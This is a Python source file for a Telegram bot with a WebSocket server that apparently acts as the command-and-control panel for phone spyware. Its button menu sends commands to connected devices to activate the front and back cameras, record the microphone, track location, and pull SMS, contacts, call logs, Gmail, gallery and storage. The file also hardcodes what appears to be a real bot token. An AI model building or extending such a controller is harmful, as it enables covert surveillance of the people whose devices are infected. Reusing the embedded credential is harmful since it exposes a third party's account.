import asyncio
import websockets
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes
)

BOT_TOKEN = "8061750485:AAGnoNlwDeXC8ahGXZt9r0MRGVicrMnRg_I"  # <-- Replace with your bot token
connected_clients = set()

logging.basicConfig(level=logging.INFO)

async def broadcast(message):
    if connected_clients:
        await asyncio.wait([client.send(message) for client in connected_clients])

def simulate_trigger(command):
    triggers = {
        "back_camera": "[Trigger] Back camera activated",
        "front_camera": "[Trigger] Front camera activated",
        "sms": "[Trigger] SMS module started",
        "contact": "[Trigger] Contact list fetching",
        "gmail": "[Trigger] Gmail sync triggered",
        "device_info": "[Trigger] Device info request sent",
        "storage": "[Trigger] Internal storage scan started",
        "gallery": "[Trigger] Gallery opened",
        "photo": "[Trigger] Photo capture or scan",
        "video": "[Trigger] Video capture or fetch",
        "camera": "[Trigger] General camera action",
        "location": "[Trigger] Location tracking initiated",
        "record": "[Trigger] Microphone recording started",
        "microphone": "[Trigger] Microphone access",
        "calllog": "[Trigger] Call log access"
    }
    return triggers.get(command, f"[Trigger] Unknown command: {command}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Back Camera", callback_data='back_camera'),
         InlineKeyboardButton("Front Camera", callback_data='front_camera')],
        [InlineKeyboardButton("Camera", callback_data='camera'),
         InlineKeyboardButton("Photo", callback_data='photo')],
        [InlineKeyboardButton("Video", callback_data='video'),
         InlineKeyboardButton("Record Audio", callback_data='record')],
        [InlineKeyboardButton("Microphone", callback_data='microphone'),
         InlineKeyboardButton("Call Logs", callback_data='calllog')],
        [InlineKeyboardButton("SMS", callback_data='sms'),
         InlineKeyboardButton("Contact", callback_data='contact')],
        [InlineKeyboardButton("Gmail", callback_data='gmail'),
         InlineKeyboardButton("Device Info", callback_data='device_info')],
        [InlineKeyboardButton("Location", callback_data='location'),
         InlineKeyboardButton("Storage", callback_data='storage')],
        [InlineKeyboardButton("Gallery", callback_data='gallery')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Choose a feature to send to the app:", reply_markup=reply_markup)

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    response_text = f"Selected: {query.data}\n" + simulate_trigger(query.data)
    await query.edit_message_text(text=response_text)
    await broadcast(query.data)

async def socket_handler(websocket):
    connected_clients.add(websocket)
    try:
        async for message in websocket:
            print(f"[App] Sent message: {message}")
    finally:
        connected_clients.remove(websocket)

async def main():
    # Start WebSocket server
    asyncio.create_task(websockets.serve(socket_handler, '0.0.0.0', 8080))

    # Start Telegram bot
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button))
    await application.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
